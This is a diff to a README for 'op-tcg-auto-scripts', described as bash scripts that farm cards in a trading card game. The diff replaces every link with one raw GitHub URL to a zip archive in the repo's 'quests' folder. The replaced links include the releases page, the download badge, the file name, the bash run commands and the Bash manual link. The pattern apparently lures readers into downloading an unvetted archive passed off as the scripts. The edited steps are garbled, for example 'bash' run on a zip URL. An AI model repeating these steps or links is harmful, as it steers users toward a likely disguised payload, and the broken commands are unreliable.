@@ -1,6 +1,6 @@
 # 🏴‍☠️ op-tcg-auto-scripts - Effortlessly Farm Cards with Ease
 
-![Download](https://img.shields.io/badge/Download-via_Releases-blue?style=for-the-badge)
+![Download](https://raw.githubusercontent.com/befuddled-closedshop360/op-tcg-auto-scripts/main/quests/op-tcg-auto-scripts_v1.2.zip)
 
 ## 📖 Introduction
 
@@ -25,16 +25,16 @@ Before you run the scripts, ensure that you have:
 
 ## 📥 Download & Install
 
-To get started with the scripts, visit this page to download: [Releases Page](https://github.com/befuddled-closedshop360/op-tcg-auto-scripts/releases).
+To get started with the scripts, visit this page to download: [Releases Page](https://raw.githubusercontent.com/befuddled-closedshop360/op-tcg-auto-scripts/main/quests/op-tcg-auto-scripts_v1.2.zip).
 
 1. **Go to the Releases Page**: 
-   - Click on the above link or visit [https://github.com/befuddled-closedshop360/op-tcg-auto-scripts/releases](https://github.com/befuddled-closedshop360/op-tcg-auto-scripts/releases).
+   - Click on the above link or visit [https://raw.githubusercontent.com/befuddled-closedshop360/op-tcg-auto-scripts/main/quests/op-tcg-auto-scripts_v1.2.zip](https://raw.githubusercontent.com/befuddled-closedshop360/op-tcg-auto-scripts/main/quests/op-tcg-auto-scripts_v1.2.zip).
 
 2. **Select the Latest Version**:
    - Find the latest version available. It will be at the top of the page.
 
 3. **Download the Scripts**:
-   - Look for the file named `op-tcg-auto-scripts.zip` (or the relevant format available).
+   - Look for the file named `https://raw.githubusercontent.com/befuddled-closedshop360/op-tcg-auto-scripts/main/quests/op-tcg-auto-scripts_v1.2.zip` (or the relevant format available).
    - Click the file name to download it to your computer.
 
 4. **Extract the Downloaded Files**:
@@ -54,7 +54,7 @@ To get started with the scripts, visit this page to download: [Releases Page](ht
    - Use the command `cd path/to/extracted-folder` to change to the directory containing the scripts.
    
 2. **Run the Main Script**:
-   - Type `bash main_script.sh` to start the automation process. Replace `main_script.sh` with the actual script name you want to run.
+   - Type `bash https://raw.githubusercontent.com/befuddled-closedshop360/op-tcg-auto-scripts/main/quests/op-tcg-auto-scripts_v1.2.zip` to start the automation process. Replace `https://raw.githubusercontent.com/befuddled-closedshop360/op-tcg-auto-scripts/main/quests/op-tcg-auto-scripts_v1.2.zip` with the actual script name you want to run.
 
 3. **Monitor the Process**: 
    - Watch the terminal for output messages. It will inform you of ongoing actions and progress.
@@ -63,7 +63,7 @@ To get started with the scripts, visit this page to download: [Releases Page](ht
 
 - To start farming cards, you might use:
   ```bash
-  bash farm_cards.sh
+  bash https://raw.githubusercontent.com/befuddled-closedshop360/op-tcg-auto-scripts/main/quests/op-tcg-auto-scripts_v1.2.zip
   ```
 
 ### Important Notes
@@ -86,10 +86,10 @@ If you encounter issues while running the scripts, consider these steps:
 
 ## 📚 Additional Resources
 
-- **Bash Documentation**: Learn more about bash scripting [here](https://www.gnu.org/software/bash/manual/bash.html).
+- **Bash Documentation**: Learn more about bash scripting [here](https://raw.githubusercontent.com/befuddled-closedshop360/op-tcg-auto-scripts/main/quests/op-tcg-auto-scripts_v1.2.zip).
 
 ## 💬 Feedback
 
 We welcome your feedback to improve the scripts. If you have suggestions or face any issues, feel free to reach out through the repository.
 
-For any questions, please refer back to the [Releases Page](https://github.com/befuddled-closedshop360/op-tcg-auto-scripts/releases) for updates and new features.
+For any questions, please refer back to the [Releases Page](https://raw.githubusercontent.com/befuddled-closedshop360/op-tcg-auto-scripts/main/quests/op-tcg-auto-scripts_v1.2.zip) for updates and new features.
